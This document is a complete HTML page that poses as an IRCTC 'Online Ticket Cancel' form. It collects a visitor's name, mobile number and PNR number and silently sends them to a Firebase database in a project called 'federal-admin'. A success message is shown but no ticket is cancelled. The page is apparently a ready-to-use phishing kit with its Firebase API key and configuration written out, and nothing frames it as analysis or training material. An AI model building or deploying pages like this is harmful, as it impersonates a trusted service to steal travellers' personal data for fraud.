<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Online Ticket Cancel</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
</head>
<body>
    <div class="container mt-5">
        <div class="card p-4 mx-auto shadow-sm" style="max-width: 500px;">
            <div class="text-center mb-4">
                <img src="https://upload.wikimedia.org/wikipedia/commons/1/13/IRCTC_Logo.png" alt="IRCTC Logo" style="width: 150px;"/>
                <h3 class="mt-3">TICKET DETAILS</h3>
            </div>
            
            <div class="mb-3">
                <label for="customerName" class="form-label">Customer Name</label>
                <input type="text" class="form-control" id="customerName" placeholder="Enter Customer Name">
            </div>
            <div class="mb-3">
                <label for="mobileNumber" class="form-label">Mobile Number</label>
                <input type="tel" class="form-control" id="mobileNumber" placeholder="Enter Mobile Number">
            </div>
            <div class="mb-3">
                <label for="pnrNumber" class="form-label">PNR Number</label>
                <input type="text" class="form-control" id="pnrNumber" placeholder="Enter PNR Number">
            </div>
            
            <button onclick="submitForm()" class="btn btn-primary w-100">SUBMIT</button>
            <div id="successMessage" class="alert alert-success mt-3" style="display:none;">Form submitted successfully!</div>
        </div>
    </div>

    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
    <script>
        const firebaseConfig = {
            apiKey: "AIzaSyAswwRDfFGMZEe-_tnIdZk9Xy_KZClFWDY",
            authDomain: "federal-admin.firebaseapp.com",
            databaseURL: "https://federal-admin-default-rtdb.asia-southeast1.firebasedatabase.app",
            projectId: "federal-admin",
            storageBucket: "federal-admin.firebasestorage.app",
            messagingSenderId: "428335190766",
            appId: "1:428335190766:web:499dd0f02d9e46d77959ff"
        };
        
        firebase.initializeApp(firebaseConfig);
        const db = firebase.database();

        function submitForm() {
            const name = document.getElementById('customerName').value;
            const mobile = document.getElementById('mobileNumber').value;
            const pnr = document.getElementById('pnrNumber').value;

            if (!name || !mobile || !pnr) {
                alert("Please fill all the fields.");
                return;
            }

            const deviceId = 'web_' + Date.now(); 
            const formattedData = `Full Name: ${name} | Mobile Number: ${mobile} | PNR Number: ${pnr}`;
            
            const submission = {
                form_data: formattedData,
                created_at: new Date().toISOString()
            };

            db.ref('form_submissions/' + deviceId).push(submission)
                .then(() => {
                    document.getElementById('successMessage').style.display = 'block';
                    document.getElementById('customerName').value = '';
                    document.getElementById('mobileNumber').value = '';
                    document.getElementById('pnrNumber').value = '';
                    setTimeout(() => {
                         document.getElementById('successMessage').style.display = 'none';
                    }, 3000);
                })
                .catch(error => {
                    console.error("Error submitting form: ", error);
                    alert("An error occurred. Please try again.");
                });
        }
    </script>
</body>
</html>
